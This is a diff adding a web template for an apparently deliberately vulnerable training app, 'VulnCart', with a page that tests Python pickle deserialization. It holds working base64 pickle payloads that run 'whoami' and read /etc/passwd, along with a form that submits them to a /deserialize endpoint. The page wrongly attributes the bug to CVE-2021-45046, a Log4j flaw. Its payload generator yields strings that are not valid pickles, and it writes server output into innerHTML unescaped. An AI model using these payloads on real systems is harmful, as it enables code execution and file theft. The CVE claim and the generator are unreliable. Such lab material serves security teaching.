@@ -1,0 +1,200 @@
+{% extends "base.html" %}
+
+{% block title %}Deserialization Test - VulnCart{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h2>CVE-2021-45046: Insecure Deserialization Test</h2>
+        <div class="alert alert-danger">
+            <strong>Critical:</strong> This page simulates insecure deserialization vulnerabilities for educational purposes.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h4>Pickle Deserialization Exploitation</h4>
+            </div>
+            <div class="card-body">
+                <p>Insecure deserialization can lead to remote code execution when untrusted data is deserialized.</p>
+                
+                <form method="POST" id="deserializeForm">
+                    <div class="mb-3">
+                        <label for="data" class="form-label">Base64 Encoded Pickle Data:</label>
+                        <textarea class="form-control" id="data" name="data" rows="4" 
+                                  placeholder="Enter base64 encoded pickle data..."></textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-danger">Test Deserialization</button>
+                </form>
+                
+                <div id="result" class="mt-3"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5>Sample Payloads</h5>
+            </div>
+            <div class="card-body">
+                <h6>Basic Pickle Payload:</h6>
+                <code>gASVHwAAAAAAAACMBG9zLg==</code>
+                
+                <hr>
+                
+                <h6>Command Execution:</h6>
+                <code>Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScTQu</code>
+                
+                <hr>
+                
+                <h6>File Read:</h6>
+                <code>Y2J1aWx0aW5zCmV2YWwKcDAKKFMncHJpbnQob3BlbigiL2V0Yy9wYXNzd2QiKS5yZWFkKCkpJwpwMQp0cDAKUnAyLg==</code>
+                
+                <hr>
+                
+                <h6>Reverse Shell:</h6>
+                <small>See the generator below for more payloads</small>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>Payload Generator</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Command to Execute:</h6>
+                        <input type="text" id="command" class="form-control mb-2" value="whoami" placeholder="Enter command">
+                        <button class="btn btn-outline-primary btn-sm" onclick="generatePayload()">Generate Payload</button>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Generated Payload:</h6>
+                        <textarea id="generatedPayload" class="form-control" rows="3" readonly></textarea>
+                        <button class="btn btn-outline-secondary btn-sm mt-2" onclick="copyPayload()">Copy to Test</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>CVE-2021-45046 Details</h5>
+            </div>
+            <div class="card-body">
+                <h6>Vulnerability Description:</h6>
+                <p>Insecure deserialization occurs when applications deserialize untrusted data without proper validation, leading to remote code execution.</p>
+                
+                <h6>Common Vulnerable Formats:</h6>
+                <ul>
+                    <li>Python Pickle</li>
+                    <li>Java Serialization</li>
+                    <li>PHP Serialization</li>
+                    <li>XML Deserialization</li>
+                    <li>JSON Deserialization (with eval)</li>
+                </ul>
+                
+                <h6>Impact:</h6>
+                <ul>
+                    <li>Remote Code Execution (RCE)</li>
+                    <li>Privilege escalation</li>
+                    <li>Data manipulation</li>
+                    <li>Complete system compromise</li>
+                </ul>
+                
+                <h6>Mitigation:</h6>
+                <ul>
+                    <li>Use safe serialization formats (JSON, XML with validation)</li>
+                    <li>Implement input validation and sanitization</li>
+                    <li>Use allowlist for allowed classes during deserialization</li>
+                    <li>Implement proper access controls</li>
+                    <li>Use secure serialization libraries</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('deserializeForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const data = document.getElementById('data').value;
+        const resultDiv = document.getElementById('result');
+        
+        fetch('/deserialize', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'data=' + encodeURIComponent(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-info">
+                    <strong>Result:</strong> ${data.result}<br>
+                    <strong>Data:</strong> ${data.data || 'N/A'}
+                </div>
+            `;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> ${error}
+                </div>
+            `;
+        });
+    });
+    
+    function generatePayload() {
+        const command = document.getElementById('command').value;
+        if (!command) {
+            alert('Please enter a command');
+            return;
+        }
+        
+        // This is a simplified payload generator
+        // In a real scenario, you would use a proper pickle payload generator
+        const payload = btoa(`os.system('${command}')`);
+        document.getElementById('generatedPayload').value = payload;
+    }
+    
+    function copyPayload() {
+        const payload = document.getElementById('generatedPayload').value;
+        if (payload) {
+            document.getElementById('data').value = payload;
+        }
+    }
+    
+    // Quick payload buttons
+    const payloads = [
+        {name: "Basic OS", payload: "gASVHwAAAAAAAACMBG9zLg=="},
+        {name: "Whoami", payload: "Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScTQu"},
+        {name: "File Read", payload: "Y2J1aWx0aW5zCmV2YWwKcDAKKFMncHJpbnQob3BlbigiL2V0Yy9wYXNzd2QiKS5yZWFkKCkpJwpwMQp0cDAKUnAyLg=="}
+    ];
+    
+    payloads.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-secondary btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('data').value = item.payload;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+</script>
+{% endblock %} 
